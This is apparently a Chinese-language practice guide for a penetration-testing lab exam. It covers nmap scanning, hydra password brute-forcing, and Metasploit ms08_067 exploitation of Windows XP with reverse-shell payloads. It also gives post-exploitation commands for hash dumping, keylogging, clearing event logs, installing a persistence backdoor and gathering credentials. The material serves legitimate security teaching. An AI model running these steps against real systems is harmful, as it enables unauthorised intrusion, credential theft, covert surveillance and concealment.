# Practical Exam 1 Practice

> Author: Dongyi Guo
>
> Doc Version : 1.2.1

* 在正式的考试中，您将只使用Kali Linux，其他设备的配置仅为个人练习使用。
* 在本文件中，所有 ```<...>``` 的位置要求您自行寻找到相关的信息来填入。

## Question 1

#### Linux 网络设置 (Kali, Metasploitable2):

通过以下命令为Linux设备设置IP：

```bash
ip a a <IP地址>/<网络前缀> dev <网络接口>
```

通过以下命令检查当前设备IP：

```bash
ip a
```

或者：

```bash
ifconfig
```

留意对应网络接口的 ```inet``` 参数来查看 IPv4 地址。在考试中只需要对Kali Linux进行网络设置，对Metasploitable2进行配置时（使用msfadmin账号），注意使用 ```sudo``` 。

#### Windows 网络设置:

* 在正式的考试中无需配置Windows虚拟机。

在 Windows 7 或更高版本的Windows上设置网络：

* 去到 Network and Sharing Center，点击 Connections 后面的网络接口。
* 点击 Properties。
* 高亮选择 "Internet Protocol Version 4 (TCP/IPv4)"，点击 Properties。
* 在新窗口中设置IP和子网掩码。

对于 Windows XP：

* 去到 Control Panel （控制面板）。
* 双击 Network Connection。
* 双击存在的网络接口。
* 选择 Properties。
* 高亮选择 "Internet Protocol [TCP/IP]"，点击 Properties。
* 在新窗口中设置IP和子网掩码。

## Question 2

通过 ```nmap``` 找到网络中活动的主机：

```bash
nmap -sn <网络地址/网络前缀>
```

对目标主机进行端口扫描：

```bash
nmap <主机地址>
```

如需获取目标主机系统信息：

```bash
nmap -O -v <主机地址>
```

如果在自主练习时需要关闭防火墙：

* 在开始菜单中搜索 "Windows Firewall"，并点选那个只有这两个单词的选项。
* 在侧边栏菜单中点选 "Turn Windows Firewall on or off"。
* 关闭所有防火墙服务。

## Question 3

通过 ```hydra``` 可以brute-force密码验证，在给定一个登录名，主机和被突破的服务协议的情况下，您同时需要一个密码字典：

```bash
hydra -l <登录名> -P <密码字典文件路径> <主机地址> <服务协议> -t <并行任务数量>
```

可以在：

```bash
man hydra
```

获取所有 ```hydra``` 支持的服务协议。

## Question 4

Windows XP 可用的攻破方式有：

* VNC injection, 会返回一个图形界面可供检视和操作.
* Meterpreter, 会返回一个命令行界面，提供多种功能.

启动Metasploit Framework (命令提示符为: ```msf6>``` 之后)，对于 VNC injection：

```bash
use exploit/windows/smb/ms08_067_netapi
set payload windows/vncinject/reverse_tcp
set LHOST <Kali的IP地址>
set RHOST <XP的IP地址>
set ViewOnly false
exploit
```

对于 Meterpreter：

```bash
use exploit/windows/smb/ms08_067_netapi
set payload windows/meterpreter/reverse_tcp
set LHOST <Kali的IP地址>
set RHOST <XP的IP地址>
exploit
```

在 Meterpreter 会话中 (命令提示符为: ```meterpreter>``` 之后)，可用的命令有：

```bash
cd <文件目录> # 切换文件目录
ls # 列出当前文件目录内容
pwd # 显示当前文件目录
sysinfo # 显示系统信息
ipconfig # 显示网络配置
screenshot # 截图屏幕
hashdump # 打印设备用户和其加密过的密码
search -f <文件名> # 从当前文件目录开始搜寻文件
download <远程路径> <本地路径> # 下载远程文件到本地位置
# download 只识别Unix系统中反斜杠('/')来表示文件层级，对于Windows的正斜杠('\'),
# 可以替换成双正斜杠('\\')'或者改回反斜杠

clearev # 清除事件记录

getpid # 获取当前寄生进程ID
ps # 列出当前系统进程
migrate <processID> # 通过声明ID移植到新的进程
# 按键记录器以下仅在寄生进程权限较高时（如文件管理器进程）可用
keyscan_start # 启动按键记录
keyscan_dump # 获取已生成的按键记录
keyscan_stop # 停止按键记录

# 将当前Meterpreter会话放至后台
background
# 或者
bg
# 或者 ctrl + z
```

如需给Meterpreter会话的目标主机添加后门，后台该会话，然后在Metasploit Framework中：

```bash
use exploit/windows/local/persistence
set LHOST <Kali的IP地址>
set LPORT 445
set STARTUP SYSTEM # SYSTEM不要小写
sessions # 获取Meterpreter会话ID
set session <Meterpreter会话ID> 
exploit
```

然后开始监听后门的回执：

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <Kali的IP地址>
set LPORT 445
run # 和exploit是一样的
```

之后，若XP重启，其会发送一个链接请求到Kali，之前的监听窗口会自动进入Meterpreter。

## MSF Essentials

在Metasploit Framework的窗口中：

```bash
search <关键字> # 通过关键字寻找漏洞
show options # 显示当前漏洞和payload中可配置的参数
show paylaods # 显示当前漏洞可用的payload
show targets # 显示当前漏洞可用的目标
```

* 可以使用 ```setg``` 来取代 ```set``` ，这样如果需要在多个漏洞模组之间切换，如果参数有同名的，参数值将会被保留。
* 参数名大小写不敏感，但是参数值，特别是在 ```show options``` 中给定可接受的参数值的 (Accepted: ...)， 必须严格遵守大小写：

```bash
set sTArTuP SYSTEM # 彳亍
set STARTUP system # 不彳亍
```

## Post-Exploitation Information Gathering

* 这通常意味着我们需要对目标已经有一个有管理员权限的会话。

如果您有一个reverse shell的会话想升级到Meterpreter会话，可使用：

```bash
sessions # 检查reverse shell会话的会话ID
sessions -u <ReverseShell会话ID>
```

如果您有一个一般权限的Meterpreter会话, 想找到漏洞来跃迁您的权限，可使用：

```bash
sessions # 检查Meterpreter会话的会话
use post/multi/recon/local_exploit_suggester
set session <UnprivilegedMeterpreter会话ID>
run
```

来列出可用的漏洞来跃迁目标权限。

获得了管理员权限的会话之后，可以在MSF中搜索获取信息的模组：

```bash
# 对于 Linux
search post/linux/gather
# 对于 Windows
search post/windows/gather
```

比较常用的信息获取模组有：

```bash
use post/<linux/windows>/gather/checkvm # 检查目标是否为虚拟机，如果是则列出虚拟化服务
use post/linux/gather/checkcontainer # 检查目标是否为容器
use post/linux/gather/hashdump # 显示目标用户和加密过的密码
use post/windows/gather/smart_hashdump # 显示目标用户和加密过的密码并保存至 /root/.msf4/loot/
use post/linux/gather/enum_protections # 显示目标设备的安全措施
use post/linux/gather/enum_configs # 显示目标设备的服务配置文件并保存至 /root/.msf4/loot/
use post/linux/gather/enum_network # 显示目标设备的网络配置信息并保存至 /root/.msf4/loot/
use post/linux/gather/enum_system # 显示目标设备的系统信息并保存至 /root/.msf4/loot/
```

将 ```session``` 参数设置为管理员权限的Meterpreter会话ID就可以开始获取信息了：

```bash
set session <Meterpreter会话ID>
run
```

